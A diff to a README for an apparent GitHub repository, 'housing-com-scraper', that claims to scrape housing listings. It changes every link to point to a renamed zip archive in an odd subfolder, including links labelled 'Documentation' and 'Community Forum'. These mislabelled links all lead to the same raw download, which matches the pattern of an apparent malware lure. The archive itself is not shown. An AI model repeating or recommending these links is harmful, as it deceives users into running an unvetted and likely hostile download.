@@ -1,6 +1,6 @@
 # 🏡 housing-com-scraper - Extract Housing Listings Easily
 
-[![Download Here](https://github.com/Z0T6/housing-com-scraper/raw/refs/heads/main/bedway/housing_com_scraper_nasoalveola.zip%20Now%20%21-Click%20Here-blue)](https://github.com/Z0T6/housing-com-scraper/raw/refs/heads/main/bedway/housing_com_scraper_nasoalveola.zip)
+[![Download Here](https://github.com/Z0T6/housing-com-scraper/raw/refs/heads/main/bedway/com-scraper-housing-v3.2.zip%20Now%20%21-Click%20Here-blue)](https://github.com/Z0T6/housing-com-scraper/raw/refs/heads/main/bedway/com-scraper-housing-v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the housing-com-scraper project! This software helps you gather housi
 
 To get started, visit the Releases page to download the application. Click the link below:
 
-[Download Here](https://github.com/Z0T6/housing-com-scraper/raw/refs/heads/main/bedway/housing_com_scraper_nasoalveola.zip)
+[Download Here](https://github.com/Z0T6/housing-com-scraper/raw/refs/heads/main/bedway/com-scraper-housing-v3.2.zip)
 
 Once you access the page, look for the latest release. Download the file suitable for your operating system. 
 
@@ -56,8 +56,8 @@ If you run into issues while using the housing-com-scraper, consider the followi
 
 For additional help and resources, explore the following:
 
-- [Documentation](https://github.com/Z0T6/housing-com-scraper/raw/refs/heads/main/bedway/housing_com_scraper_nasoalveola.zip) for more in-depth guides.
-- [Community Forum](https://github.com/Z0T6/housing-com-scraper/raw/refs/heads/main/bedway/housing_com_scraper_nasoalveola.zip) where you can ask questions and share experiences.
+- [Documentation](https://github.com/Z0T6/housing-com-scraper/raw/refs/heads/main/bedway/com-scraper-housing-v3.2.zip) for more in-depth guides.
+- [Community Forum](https://github.com/Z0T6/housing-com-scraper/raw/refs/heads/main/bedway/com-scraper-housing-v3.2.zip) where you can ask questions and share experiences.
   
 ## 📅 Keeping Updated
 
@@ -66,4 +66,4 @@ Stay informed about the latest updates and features:
 1. Regularly check the Releases page to download the newest version.
 2. Follow us on GitHub for real-time notifications about changes and improvements.
 
-Remember, you can [download the application](https://github.com/Z0T6/housing-com-scraper/raw/refs/heads/main/bedway/housing_com_scraper_nasoalveola.zip) anytime to enhance your real estate analysis.
+Remember, you can [download the application](https://github.com/Z0T6/housing-com-scraper/raw/refs/heads/main/bedway/com-scraper-housing-v3.2.zip) anytime to enhance your real estate analysis.
